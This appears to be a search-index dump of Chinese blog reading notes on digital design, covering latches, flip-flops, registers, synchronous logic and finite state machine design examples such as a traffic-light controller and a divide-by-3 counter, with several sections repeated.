R 都是 0，因此输出 1（$Q$=1） S=1，R=1 Q 和$\\bar{Q}$都输出 0，冲突，这种情况不应当存在 因为 R=1 时 Q=0，S=1 时 Q=1，因此 S 和 R 称为 Set 和 Reset。 SR 锁存器有一些问题： S 和 R 都为 1 时发生冲突，因此不应该让 SR 同时为 1 当某个输入被设置为 1 时，状态立刻改变，我们应当对这个改变的时刻加以控制。输入的改变和状态的改变，应当分开进行控制。 3.2.2 D Latch D 锁存器的出现是为了解决 SR 锁存器的上述两个问题，我们进行了两方面的调整： 引入输入 D 引入时钟信号 CLK，用 CLK 的高低控制锁存器的开闭 D 锁存器的工作机制和 SR 锁存器类似，当 CLK=1 时，S=$\\bar{D}$，否则 SR 寄存器保持原有状态，这种机制称为level-sensitive latch，也就是锁存器状态取决于 CLK 为 1 时电平信号的高低。 D 锁存器也有一点小小的缺陷，也就是 CLK 为 1 时，锁存器的状态完全取决于 D 电平信号的高低。如果 D 的电平信号震荡，锁存器的状态也会随之上下改变。我们希望能够实现锁存器状态的稳定，让状态更新在一个时刻完成，而不是一段时间，要解决这个问题，下面我们引入 D 触发器。 3.2.3 D flip-flop D 触发器由两个接入相反时钟状态的 D 锁存器构成，前一个称为master，后一个称为slave。其特性在于： 当 CLK=0 时，master打入值，slave的值不随master改变 当 CLK=1 时，slave打入值，master的值不随输入改变 因此，触发器的状态主要取决于 CLK 从 0 到 1 时，实现锁存器的状态转换，而其他时刻状态不变。这样就解决了 D 锁存器状态因转换的时间过长而带来的可能的状态震荡。该触发方式也叫边沿触发。 3.2.4 Register寄存器由多个触发器组成，可以存储多位的值，每个触发器存储 1 位的值，通过给他们连接同步的时实现。 3.2.5 Enabled Flip-Flop 使能触发器在普通的 D 触发器的基础上，增加了一个 2 选 1 数据选择器。数据选择器的选择端是使能信号，两个数据信号分别是输入 D 和触发器的之前状态。 其状态如下： Enable = 1 时，使能触发器输入为 D Enable = 0 时，使能触发器保持之前状态 使能触发器相对于 D 触发器做出的改进在于：我们只有在希望的时候才打入输入，而不是在每次时钟上升沿都打入。其控制能力相比 D 触发器更上一层。 3.2.6 Resettable Flip-Flop 可复位触发器相比使能触发器的区别在于，当 reset 信号为 1 时，与门输出为 0，打入的信号为 0，状态更新为 0，实现状态复位。该设置常用于对触发器进行同步/异步复位。 3.2.7 Transistor-Level Latch and Flip-Flop Designs* 此段省略。 3.2.8 Putting It All Together D 锁存器：高电平触发 D 触发器：时钟上升沿触发 3.2.9 Summary下面我们对本章介绍的多个锁存器和触发器、以及寄存器进行介绍，最重要的是D 触发器。 SR 锁存器：实现了过去状态的存储，但是 SR 均为 1 时电路无效，并且无法控制状态转换的时刻 D 锁存器：解决了 SR=1 时的无效状态，引入 CLK 时钟对电路进行控制，但是状态变化的间隔过长，容易导致在高电平期间，电路状态随着输入变化而持续变化，我们希望在某个时刻完成状态转换，然后保持其不变 D 触发器：采用master-slave结构，master接$\\bar{CLK}$，而slave接 CLK。master在低电平期间状态改变，其他时候不变。slave在高电平期间状态改变，其他时候不变。因此最终的结果是触发器的状态取决于时钟上升沿。但是在每次时钟上升沿，电路的状态都会随着输入的状态改变。因此我们希望设置一下电路是接受输入，还是保持状态不变 D 使能触发器：在 D 触发器的基础上增加一个数据选择器，利用使能信号来选择下一个时钟上升沿，打入slave的值是新的输入，还是电路之前的状态 D 复位触发器：将 D 触发器的输入和$\\bar{RESET}$进行与操作，如果RESET = 1，那么$\\bar{RESET} = 0$，输入为 0，实现了触发器的复位 寄存器：由多个触发器构成，每个触发器接的是相同的时钟 ","date":"2024-05-01","objectID":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/:3:2","series":null,"tags":["计算机组成原理"],"title":"\u003cDigital Design and Computer Architecture\u003e MIPS 版本 阅读笔记","uri":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/#transistor-level-latch-and-flip-flop-designs"},{"categories":["计算机体系结构"],"content":" 3.2 3.2 Latches and Flip-Flops 上图中表示的是一个维持稳定状态的电路，为什么说它们维持稳定状态呢？ 对（a）中电路，如果 I2 的输入为 0，$\\bar{Q}$为 1，I1 的输入为 0，又传回 I2，电路状态永远不变。当 I2 的输入为 1 时，同上。 对（b）中电路，如果 I2 的输入为 0，那么 I1 的输入为 1，Q 为 0，$\\bar{Q}$为 1，电路状态保持不变；反之亦然。 在 Q 和$\\bar{Q}$的值变化的过程中，可能存在其他的状态，这个情况我们在后面会进行讨论。 以上的电路有 2 个状态，可以承载 1 个 bit 的信息。那么 N 个状态的电路，就可以承载$\\log_{2}N$个 bit 的信息。Q 是该电路的一个有效状态，$\\bar{Q}$也可以说是一个有效状态，但是我们知道它是 Q 的取反，因此知道 Q 就够了。 但是这个电路的不足在于，我们不知道他是什么状态，我们无法输入，这个问题需要修复。 3.2.1 SR Latch SR 锁存器特点： 2 个输入：S 和 R 2 个输出：Q 和$\\bar{Q}$ SR 锁存器真值表： S=0，R=0 N2 输出对 Q 取反，N1 输出对$\\bar{Q}$取反。因为 N2 的输出原本就是$\\bar{Q}$，N1 的输出原本就是 Q，因此状态不变 S=0，R=1 N1 输出 0（Q=0），N2 这里 Q 和 S 都是 0，因此输出 1（$\\bar{Q}$=1） S=1，R=0 N2 输出 0（$\\bar{Q}$=0），N1 这里$\\bar{Q}$和 R 都是 0，因此输出 1（$Q$=1） S=1，R=1 Q 和$\\bar{Q}$都输出 0，冲突，这种情况不应当存在 因为 R=1 时 Q=0，S=1 时 Q=1，因此 S 和 R 称为 Set 和 Reset。 SR 锁存器有一些问题： S 和 R 都为 1 时发生冲突，因此不应该让 SR 同时为 1 当某个输入被设置为 1 时，状态立刻改变，我们应当对这个改变的时刻加以控制。输入的改变和状态的改变，应当分开进行控制。 3.2.2 D Latch D 锁存器的出现是为了解决 SR 锁存器的上述两个问题，我们进行了两方面的调整： 引入输入 D 引入时钟信号 CLK，用 CLK 的高低控制锁存器的开闭 D 锁存器的工作机制和 SR 锁存器类似，当 CLK=1 时，S=$\\bar{D}$，否则 SR 寄存器保持原有状态，这种机制称为level-sensitive latch，也就是锁存器状态取决于 CLK 为 1 时电平信号的高低。 D 锁存器也有一点小小的缺陷，也就是 CLK 为 1 时，锁存器的状态完全取决于 D 电平信号的高低。如果 D 的电平信号震荡，锁存器的状态也会随之上下改变。我们希望能够实现锁存器状态的稳定，让状态更新在一个时刻完成，而不是一段时间，要解决这个问题，下面我们引入 D 触发器。 3.2.3 D flip-flop D 触发器由两个接入相反时钟状态的 D 锁存器构成，前一个称为master，后一个称为slave。其特性在于： 当 CLK=0 时，master打入值，slave的值不随master改变 当 CLK=1 时，slave打入值，master的值不随输入改变 因此，触发器的状态主要取决于 CLK 从 0 到 1 时，实现锁存器的状态转换，而其他时刻状态不变。这样就解决了 D 锁存器状态因转换的时间过长而带来的可能的状态震荡。该触发方式也叫边沿触发。 3.2.4 Register寄存器由多个触发器组成，可以存储多位的值，每个触发器存储 1 位的值，通过给他们连接同步的时实现。 3.2.5 Enabled Flip-Flop 使能触发器在普通的 D 触发器的基础上，增加了一个 2 选 1 数据选择器。数据选择器的选择端是使能信号，两个数据信号分别是输入 D 和触发器的之前状态。 其状态如下： Enable = 1 时，使能触发器输入为 D Enable = 0 时，使能触发器保持之前状态 使能触发器相对于 D 触发器做出的改进在于：我们只有在希望的时候才打入输入，而不是在每次时钟上升沿都打入。其控制能力相比 D 触发器更上一层。 3.2.6 Resettable Flip-Flop 可复位触发器相比使能触发器的区别在于，当 reset 信号为 1 时，与门输出为 0，打入的信号为 0，状态更新为 0，实现状态复位。该设置常用于对触发器进行同步/异步复位。 3.2.7 Transistor-Level Latch and Flip-Flop Designs* 此段省略。 3.2.8 Putting It All Together D 锁存器：高电平触发 D 触发器：时钟上升沿触发 3.2.9 Summary下面我们对本章介绍的多个锁存器和触发器、以及寄存器进行介绍，最重要的是D 触发器。 SR 锁存器：实现了过去状态的存储，但是 SR 均为 1 时电路无效，并且无法控制状态转换的时刻 D 锁存器：解决了 SR=1 时的无效状态，引入 CLK 时钟对电路进行控制，但是状态变化的间隔过长，容易导致在高电平期间，电路状态随着输入变化而持续变化，我们希望在某个时刻完成状态转换，然后保持其不变 D 触发器：采用master-slave结构，master接$\\bar{CLK}$，而slave接 CLK。master在低电平期间状态改变，其他时候不变。slave在高电平期间状态改变，其他时候不变。因此最终的结果是触发器的状态取决于时钟上升沿。但是在每次时钟上升沿，电路的状态都会随着输入的状态改变。因此我们希望设置一下电路是接受输入，还是保持状态不变 D 使能触发器：在 D 触发器的基础上增加一个数据选择器，利用使能信号来选择下一个时钟上升沿，打入slave的值是新的输入，还是电路之前的状态 D 复位触发器：将 D 触发器的输入和$\\bar{RESET}$进行与操作，如果RESET = 1，那么$\\bar{RESET} = 0$，输入为 0，实现了触发器的复位 寄存器：由多个触发器构成，每个触发器接的是相同的时钟 ","date":"2024-05-01","objectID":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/:3:2","series":null,"tags":["计算机组成原理"],"title":"\u003cDigital Design and Computer Architecture\u003e MIPS 版本 阅读笔记","uri":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/#putting-it-all-together"},{"categories":["计算机体系结构"],"content":" 3.2 3.2 Latches and Flip-Flops 上图中表示的是一个维持稳定状态的电路，为什么说它们维持稳定状态呢？ 对（a）中电路，如果 I2 的输入为 0，$\\bar{Q}$为 1，I1 的输入为 0，又传回 I2，电路状态永远不变。当 I2 的输入为 1 时，同上。 对（b）中电路，如果 I2 的输入为 0，那么 I1 的输入为 1，Q 为 0，$\\bar{Q}$为 1，电路状态保持不变；反之亦然。 在 Q 和$\\bar{Q}$的值变化的过程中，可能存在其他的状态，这个情况我们在后面会进行讨论。 以上的电路有 2 个状态，可以承载 1 个 bit 的信息。那么 N 个状态的电路，就可以承载$\\log_{2}N$个 bit 的信息。Q 是该电路的一个有效状态，$\\bar{Q}$也可以说是一个有效状态，但是我们知道它是 Q 的取反，因此知道 Q 就够了。 但是这个电路的不足在于，我们不知道他是什么状态，我们无法输入，这个问题需要修复。 3.2.1 SR Latch SR 锁存器特点： 2 个输入：S 和 R 2 个输出：Q 和$\\bar{Q}$ SR 锁存器真值表： S=0，R=0 N2 输出对 Q 取反，N1 输出对$\\bar{Q}$取反。因为 N2 的输出原本就是$\\bar{Q}$，N1 的输出原本就是 Q，因此状态不变 S=0，R=1 N1 输出 0（Q=0），N2 这里 Q 和 S 都是 0，因此输出 1（$\\bar{Q}$=1） S=1，R=0 N2 输出 0（$\\bar{Q}$=0），N1 这里$\\bar{Q}$和 R 都是 0，因此输出 1（$Q$=1） S=1，R=1 Q 和$\\bar{Q}$都输出 0，冲突，这种情况不应当存在 因为 R=1 时 Q=0，S=1 时 Q=1，因此 S 和 R 称为 Set 和 Reset。 SR 锁存器有一些问题： S 和 R 都为 1 时发生冲突，因此不应该让 SR 同时为 1 当某个输入被设置为 1 时，状态立刻改变，我们应当对这个改变的时刻加以控制。输入的改变和状态的改变，应当分开进行控制。 3.2.2 D Latch D 锁存器的出现是为了解决 SR 锁存器的上述两个问题，我们进行了两方面的调整： 引入输入 D 引入时钟信号 CLK，用 CLK 的高低控制锁存器的开闭 D 锁存器的工作机制和 SR 锁存器类似，当 CLK=1 时，S=$\\bar{D}$，否则 SR 寄存器保持原有状态，这种机制称为level-sensitive latch，也就是锁存器状态取决于 CLK 为 1 时电平信号的高低。 D 锁存器也有一点小小的缺陷，也就是 CLK 为 1 时，锁存器的状态完全取决于 D 电平信号的高低。如果 D 的电平信号震荡，锁存器的状态也会随之上下改变。我们希望能够实现锁存器状态的稳定，让状态更新在一个时刻完成，而不是一段时间，要解决这个问题，下面我们引入 D 触发器。 3.2.3 D flip-flop D 触发器由两个接入相反时钟状态的 D 锁存器构成，前一个称为master，后一个称为slave。其特性在于： 当 CLK=0 时，master打入值，slave的值不随master改变 当 CLK=1 时，slave打入值，master的值不随输入改变 因此，触发器的状态主要取决于 CLK 从 0 到 1 时，实现锁存器的状态转换，而其他时刻状态不变。这样就解决了 D 锁存器状态因转换的时间过长而带来的可能的状态震荡。该触发方式也叫边沿触发。 3.2.4 Register寄存器由多个触发器组成，可以存储多位的值，每个触发器存储 1 位的值，通过给他们连接同步的时实现。 3.2.5 Enabled Flip-Flop 使能触发器在普通的 D 触发器的基础上，增加了一个 2 选 1 数据选择器。数据选择器的选择端是使能信号，两个数据信号分别是输入 D 和触发器的之前状态。 其状态如下： Enable = 1 时，使能触发器输入为 D Enable = 0 时，使能触发器保持之前状态 使能触发器相对于 D 触发器做出的改进在于：我们只有在希望的时候才打入输入，而不是在每次时钟上升沿都打入。其控制能力相比 D 触发器更上一层。 3.2.6 Resettable Flip-Flop 可复位触发器相比使能触发器的区别在于，当 reset 信号为 1 时，与门输出为 0，打入的信号为 0，状态更新为 0，实现状态复位。该设置常用于对触发器进行同步/异步复位。 3.2.7 Transistor-Level Latch and Flip-Flop Designs* 此段省略。 3.2.8 Putting It All Together D 锁存器：高电平触发 D 触发器：时钟上升沿触发 3.2.9 Summary下面我们对本章介绍的多个锁存器和触发器、以及寄存器进行介绍，最重要的是D 触发器。 SR 锁存器：实现了过去状态的存储，但是 SR 均为 1 时电路无效，并且无法控制状态转换的时刻 D 锁存器：解决了 SR=1 时的无效状态，引入 CLK 时钟对电路进行控制，但是状态变化的间隔过长，容易导致在高电平期间，电路状态随着输入变化而持续变化，我们希望在某个时刻完成状态转换，然后保持其不变 D 触发器：采用master-slave结构，master接$\\bar{CLK}$，而slave接 CLK。master在低电平期间状态改变，其他时候不变。slave在高电平期间状态改变，其他时候不变。因此最终的结果是触发器的状态取决于时钟上升沿。但是在每次时钟上升沿，电路的状态都会随着输入的状态改变。因此我们希望设置一下电路是接受输入，还是保持状态不变 D 使能触发器：在 D 触发器的基础上增加一个数据选择器，利用使能信号来选择下一个时钟上升沿，打入slave的值是新的输入，还是电路之前的状态 D 复位触发器：将 D 触发器的输入和$\\bar{RESET}$进行与操作，如果RESET = 1，那么$\\bar{RESET} = 0$，输入为 0，实现了触发器的复位 寄存器：由多个触发器构成，每个触发器接的是相同的时钟 ","date":"2024-05-01","objectID":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/:3:2","series":null,"tags":["计算机组成原理"],"title":"\u003cDigital Design and Computer Architecture\u003e MIPS 版本 阅读笔记","uri":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/#summary"},{"categories":["计算机体系结构"],"content":" 3.3 3.3 Synchronous Logic Design 3.3.1 3.3.1 Some Problematic Circuits 以一段时间为周期的周期性震荡的电路 存在因电路延迟带来的竞争冒险的电路 3.3.2 3.3.2 Synchronous Sequential Circuits上述电路出现问题的原因：电路中出现了环路 如何消除环路？通过向环路中间加入寄存器，将环路转化成多个段，每个寄存器都由触发器组成，在时钟上升沿触发，因此我们说该电路是时钟同步电路，以此为基础，我们设计了时序逻辑电路。 时序逻辑电路有 5 个组成要素： 多个中间状态 输入 输出 组合逻辑函数 时序，即一个同步的 CLK 时钟上升沿 -\u003e 输出开始变化：$T_{setup}$ 时钟上升沿 -\u003e 输出值稳定：$T_{hold}$ 时序逻辑电路的特点在于： 由寄存器（触发器，不是锁存器）和组合逻辑电路组成 至少有一个寄存器（触发器，不是锁存器） 所有寄存器接受相同的时钟信号（不可以有延迟） 每个环路至少有一个寄存器 3.3.3 3.3.3 Synchronous and Asynchronous Circuits异步时序逻辑电路比同步时序逻辑电路更常见，但是更复杂。这里不详述。 ","date":"2024-05-01","objectID":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/:3:3","series":null,"tags":["计算机组成原理"],"title":"\u003cDigital Design and Computer Architecture\u003e MIPS 版本 阅读笔记","uri":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/#33-synchronous-logic-design"},{"categories":["计算机体系结构"],"content":" 3.3 3.3 Synchronous Logic Design 3.3.1 3.3.1 Some Problematic Circuits 以一段时间为周期的周期性震荡的电路 存在因电路延迟带来的竞争冒险的电路 3.3.2 3.3.2 Synchronous Sequential Circuits上述电路出现问题的原因：电路中出现了环路 如何消除环路？通过向环路中间加入寄存器，将环路转化成多个段，每个寄存器都由触发器组成，在时钟上升沿触发，因此我们说该电路是时钟同步电路，以此为基础，我们设计了时序逻辑电路。 时序逻辑电路有 5 个组成要素： 多个中间状态 输入 输出 组合逻辑函数 时序，即一个同步的 CLK 时钟上升沿 -\u003e 输出开始变化：$T_{setup}$ 时钟上升沿 -\u003e 输出值稳定：$T_{hold}$ 时序逻辑电路的特点在于： 由寄存器（触发器，不是锁存器）和组合逻辑电路组成 至少有一个寄存器（触发器，不是锁存器） 所有寄存器接受相同的时钟信号（不可以有延迟） 每个环路至少有一个寄存器 3.3.3 3.3.3 Synchronous and Asynchronous Circuits异步时序逻辑电路比同步时序逻辑电路更常见，但是更复杂。这里不详述。 ","date":"2024-05-01","objectID":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/:3:3","series":null,"tags":["计算机组成原理"],"title":"\u003cDigital Design and Computer Architecture\u003e MIPS 版本 阅读笔记","uri":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/#331-some-problematic-circuits"},{"categories":["计算机体系结构"],"content":" 3.3 3.3 Synchronous Logic Design 3.3.1 3.3.1 Some Problematic Circuits 以一段时间为周期的周期性震荡的电路 存在因电路延迟带来的竞争冒险的电路 3.3.2 3.3.2 Synchronous Sequential Circuits上述电路出现问题的原因：电路中出现了环路 如何消除环路？通过向环路中间加入寄存器，将环路转化成多个段，每个寄存器都由触发器组成，在时钟上升沿触发，因此我们说该电路是时钟同步电路，以此为基础，我们设计了时序逻辑电路。 时序逻辑电路有 5 个组成要素： 多个中间状态 输入 输出 组合逻辑函数 时序，即一个同步的 CLK 时钟上升沿 -\u003e 输出开始变化：$T_{setup}$ 时钟上升沿 -\u003e 输出值稳定：$T_{hold}$ 时序逻辑电路的特点在于： 由寄存器（触发器，不是锁存器）和组合逻辑电路组成 至少有一个寄存器（触发器，不是锁存器） 所有寄存器接受相同的时钟信号（不可以有延迟） 每个环路至少有一个寄存器 3.3.3 3.3.3 Synchronous and Asynchronous Circuits异步时序逻辑电路比同步时序逻辑电路更常见，但是更复杂。这里不详述。 ","date":"2024-05-01","objectID":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/:3:3","series":null,"tags":["计算机组成原理"],"title":"\u003cDigital Design and Computer Architecture\u003e MIPS 版本 阅读笔记","uri":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/#332-synchronous-sequential-circuits"},{"categories":["计算机体系结构"],"content":" 3.3 3.3 Synchronous Logic Design 3.3.1 3.3.1 Some Problematic Circuits 以一段时间为周期的周期性震荡的电路 存在因电路延迟带来的竞争冒险的电路 3.3.2 3.3.2 Synchronous Sequential Circuits上述电路出现问题的原因：电路中出现了环路 如何消除环路？通过向环路中间加入寄存器，将环路转化成多个段，每个寄存器都由触发器组成，在时钟上升沿触发，因此我们说该电路是时钟同步电路，以此为基础，我们设计了时序逻辑电路。 时序逻辑电路有 5 个组成要素： 多个中间状态 输入 输出 组合逻辑函数 时序，即一个同步的 CLK 时钟上升沿 -\u003e 输出开始变化：$T_{setup}$ 时钟上升沿 -\u003e 输出值稳定：$T_{hold}$ 时序逻辑电路的特点在于： 由寄存器（触发器，不是锁存器）和组合逻辑电路组成 至少有一个寄存器（触发器，不是锁存器） 所有寄存器接受相同的时钟信号（不可以有延迟） 每个环路至少有一个寄存器 3.3.3 3.3.3 Synchronous and Asynchronous Circuits异步时序逻辑电路比同步时序逻辑电路更常见，但是更复杂。这里不详述。 ","date":"2024-05-01","objectID":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/:3:3","series":null,"tags":["计算机组成原理"],"title":"\u003cDigital Design and Computer Architecture\u003e MIPS 版本 阅读笔记","uri":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/#333-synchronous-and-asynchronous-circuits"},{"categories":["计算机体系结构"],"content":" 3.4 3.4 Finite State Machines时序逻辑电路可以被表示成有限状态机的形式，它通常有如下几个组成部分： M 个输入 N 个输出 k 位的状态（因此电路一共可以有$2^{k}$个状态） 一个时钟 时序逻辑电路又分两种： Moore 型电路：电路的状态由电路之前的状态和组合逻辑函数决定 Mealy 型电路：电路的状态由之前的状态，电路的输入，和组合逻辑函数决定 3.4.1 3.4.1 FSM Design Example 下面通过一个设计十字路口交通灯的案例，来演示时序逻辑电路的设计。 3.4.1.1 步骤一：明确问题背景 十字路口有两个传感器：$T_{A}$和$T_{B}$，当传感器输出为True代表有学生，输出为False代表道路空 两个交通灯：$L_{A}$和$L_{B}$，每个交通灯都要接受传感器的数据，然后决定是输出红，绿，还是黄 每个交通灯有 5 秒的间隔，交通灯在时钟上升沿通过传感器的输入，更新自己的状态 控制器还有一个 reset 按钮来实现复位 交通灯概念图设计如下： 交通灯接口设计如下： 3.4.1.2 步骤二：绘制状态转换图电路状态转换过程分析如下： 状态的初始值（复位状态）如下：A 路绿，B 路红 如果$T_{A}$为True，那么 A 路持续绿，B 路持续红；否则，A 路进入黄色，B 路红 A 路黄，B 路红时，我们无需管$T_{A}$的状态。过 5 秒自动切入下一个状态：A 路红，B 路绿 A 路红，B 路绿时，如果$T_{B}$为True，那么 A 路持续红，B 路持续绿；否则，A 路红，B 路进入黄色 A 路红，B 路进入黄色时，我们无需管$T_{B}$的状态，过 5 秒后回到初始状态，A 路绿，B 路红 根据以上分析，电路可以划分为以下几个状态： A 路绿，B 路红：$T_{A}$为True时保持，否则进入状态 2 A 路黄，B 路红：5 秒后进入状态 3 A 路红，B 路绿：$T_{B}$为True时保持，否则进入状态 4 A 路红，B 路黄：5 秒后进入状态 1 电路转换的时机是时钟上升沿 3.4.1.3 步骤三：绘制状态转换表我们将状态转换图，转化为状态转换表。在绘制过程中，我们需要明确如下几样： 状态表示：这里我们用 S0，S1，S2，S3 来表示 状态转换输入：用$T_{A}$，$T_{B}$来表示，使用 X 来表示无关项（类似卡诺图） 状态转换表的每行有 3 项： 该状态 输入 下一状态 绘制状态转换表如下： 当前状态 输入$T_{A}$ 输入$T_{B}$ 下一状态 S0 0 X S1 S0 1 X S0 S1 X X S2 S2 X 0 S3 S2 X 1 S2 S3 X X S0 3.4.1.4 步骤四：对状态进行二进制编码状态分为：S0，S1，S2，S3 状态 $S_{1}$ $S_{0}$ S0 0 0 S1 0 1 S2 1 0 S3 1 1 3.4.1.5 步骤五：对输出进行二进制编码输出分为：红、黄、绿 输出 $L_{1}$ $L_{0}$ 绿 0 0 黄 0 1 红 1 0 3.4.1.6 步骤六：确定状态与输入关系表（将状态编码嵌入到状态转换表） 当前状态 $S_{1}$ $S_{0}$ 输入$T_{A}$ 输入$T_{B}$ 下一状态 $S_{1}$ $S_{0}$ S0 0 0 0 X S1 0 1 S0 0 0 1 X S0 0 0 S1 0 1 X X S2 1 0 S2 1 0 X 0 S3 1 1 S2 1 0 X 1 S2 1 0 S3 1 1 X X S0 0 0 3.4.1.7 步骤七：确定状态与输出的关系表（根据电路分析、状态编码和输出编码） 状态 $S_{1}$ $S_{0}$ $L_{A1}$ $L_{A0}$ $L_{B1}$ $L_{B0}$ S0 0 0 0 0 1 0 S1 0 1 0 1 1 0 S2 1 0 1 0 0 0 S3 1 1 1 0 0 1 3.4.1.8 步骤八：写出状态表达式我们使用$S’$来表示下一时刻的状态，可以如下表示： $$ S_{1}’ = S_{1}S_{0} +S_{1}S_{0}T_{B} +S_{1}S_{0}T_{B} $$ $$ S_{0}’ = S_{1}S_{0}T_{A}+S_{1}S_{0}T_{B} $$ 3.4.1.9 步骤九：写出输出表达式$$ L_{A1} = S_{1}L_{A0} = S_{1}S_{0} $$ $$ L_{B1} = S_{1}L_{B0} = S_{1}S_{0} $$ 3.4.1.10 步骤十：画出电路图 设计寄存器 状态寄存器设计如图，左边是下一时刻状态，右边是之前的状态。在时钟上升沿，下一时刻状态打入寄存器，因此将其花在左边，而不是右边。 添加状态与输入关系电路 添加状态与输出关系电路 3.4.2 3.4.2 State Encodings 状态编码有分为二进制编码（binary encoding）和独热编码（One-hot encoding） 3.4.2.1 Binary EncodingN 个编码只需要$log_{2}N$位就可以表示。 3.4.2.2 One-hot EncodingN 个编码需要 N 位二进制表示，该二进制数中，对于一个状态有且仅有 1 位的值为 1。选择这种编码需要更多的触发器，但是对应的输出电路和状态转换电路会更简单。 3.4.2.3 设计示例1：3进制计数器设计一个 divide by 3 counter，当状态转换的次数为3的倍数时（对3求模 = 0），输出为1，否则输出为0 3.4.2.3.1 背景分析根据分析，电路存在3个状态： S0：初始状态，也是最终状态，输出为1。下一时刻跳转到S1 S1：输出为0，下一时刻跳转到S2 S2：输出为0，下一时刻跳转到S0 电路状态转换图如下： 3.4.2.3.2 状态转换图绘制 状态有3个，S0、S1和S2，我们分别采用二进制编码和独热编码对其进行编码。 3.4.2.3.3 采用二进制编码设计 状态编码：电路有3个状态，我们采用2位二进制进行编码，分别用$S_{1}$和$S_{0}$表示。 状态 $S_{1}$ $S_{0}$ S0 0 0 S1 0 1 S2 1 0 输出编码：电路只有1个输出，也就是Y，那么我们只需要1位二进制数表示 状态转换表 状态 $S_{1}$ $S_{0}$ 下一状态 $S_{1}'$ $S_{0}'$ S0 0 0 S1 0 1 S1 0 1 S2 1 0 S2 1 0 S0 0 0 由图我们可以得到状态表达式，下一时刻的状态用$S’$表示。 $$ S_{1}’ = \\bar{S_{1}}S_{0} $$ $$ S_{0}’ = \\bar{S_{1}}\\bar{S_{0}} $$ 状态与输出关系表 状态 $S_{1}$ $S_{0}$ 输出Y S0 0 0 1 S1 0 1 0 S2 1 0 0 由图我们可以得到输出与状态的关系式： $$ Y=\\bar{S_{1}}\\bar{S_{0}} $$ 电路图设计 3.4.2.3.4 采用独热编码设计 状态编码：独热编码对每个状态使用1位单独的二进制1，因此3个状态需要3位二进制数。 状态 $S_{2}$ $S_{1}$ $S_{0}$ S0 0 0 1 S1 0 1 0 S2 1 0 0 输出编码：电路只有1个输出，也就是Y，使用1位二进制数表示 状态转换表 状态 $S_{2}$ $S_{1}$ $S_{0}$ 下一时刻状态 $S_{2}'$ $S_{1}'$ $S_{0}'$ S0 0 0 1 S1 0 1 0 S1 0 1 0 S2 1 0 0 S2 1 0 0 S0 0 0 1 由图我们可以得到状态表达式： $$ S_{1}’ = S{0} $$ $$ S_{2}’ = S{1} $$ $$ S_{0}’ = S{2} $$ 状态与输出关系表 状态 $S_{2}$ $S_{1}$ $S_{0}$ 输出Y S0 0 0 1 1 S1 0 1 0 0 S2 1 0 0 0 由此我们可以得到状态与输出表达式：$Y=S_{0}$ 电路设计 通过上面的分析，我们可以看到，独热编码的逻辑表达式比二进制编码要简单很多，但是会更加消耗二进制位数。电路设计如下： 3.4.2.4 设计示例2：3进制累加器设计一个累加器，当连续输入3个1时，输出为1，其他时候输出为0。 3.4.2.4.1 背景分析根据分析，电路存在3个状态： S0：起始（复位）状态，输入0个3时，输出为0。若此时输入1，进入S1；否则继续S0 S1：输入1个3时，输出为0。若此时输入1，进入S2；否则进入S0 S2：输入2个3时，输出为0。若此时输入1，进入S3；否则进入S0 S3：输入3个3时，输出为1。下一状态为S0 3.4.2.4.2 状态转换图绘制 3.4.2.4.3 状态转换表绘制 状态 $S_{1}$ $S_{0}$ 输入T 下一时刻状态 $S_{1}'$ $S_{0}'$ 输出 S0 0 0 0 S0 0 0 0 S0 0 0 1 S1 0 1 0 S1 0 1 0 S0 0 0 0 S1 0 1 1 S2 1 0 0 S2 1 0 0 S0 0 0 0 S2 1 0 1 S3 1 1 0 S3 1 1 X S0 0 0 1 3.4.2.4.4 二进制编码实现 状态编码：状态有4个，因此使用2位二进制数进行编码 状态 $S_{1}$ $S_{0}$ S0 0 0 S1 0 1 S2 1 0 S3 1 1 输入编码：输入只有1个，因此","date":"2024-05-01","objectID":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/:3:4","series":null,"tags":["计算机组成原理"],"title":"\u003cDigital Design and Computer Architecture\u003e MIPS 版本 阅读笔记","uri":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/#34-finite-state-machines"},{"categories":["计算机体系结构"],"content":" 3.4 3.4 Finite State Machines时序逻辑电路可以被表示成有限状态机的形式，它通常有如下几个组成部分： M 个输入 N 个输出 k 位的状态（因此电路一共可以有$2^{k}$个状态） 一个时钟 时序逻辑电路又分两种： Moore 型电路：电路的状态由电路之前的状态和组合逻辑函数决定 Mealy 型电路：电路的状态由之前的状态，电路的输入，和组合逻辑函数决定 3.4.1 3.4.1 FSM Design Example 下面通过一个设计十字路口交通灯的案例，来演示时序逻辑电路的设计。 3.4.1.1 步骤一：明确问题背景 十字路口有两个传感器：$T_{A}$和$T_{B}$，当传感器输出为True代表有学生，输出为False代表道路空 两个交通灯：$L_{A}$和$L_{B}$，每个交通灯都要接受传感器的数据，然后决定是输出红，绿，还是黄 每个交通灯有 5 秒的间隔，交通灯在时钟上升沿通过传感器的输入，更新自己的状态 控制器还有一个 reset 按钮来实现复位 交通灯概念图设计如下： 交通灯接口设计如下： 3.4.1.2 步骤二：绘制状态转换图电路状态转换过程分析如下： 状态的初始值（复位状态）如下：A 路绿，B 路红 如果$T_{A}$为True，那么 A 路持续绿，B 路持续红；否则，A 路进入黄色，B 路红 A 路黄，B 路红时，我们无需管$T_{A}$的状态。过 5 秒自动切入下一个状态：A 路红，B 路绿 A 路红，B 路绿时，如果$T_{B}$为True，那么 A 路持续红，B 路持续绿；否则，A 路红，B 路进入黄色 A 路红，B 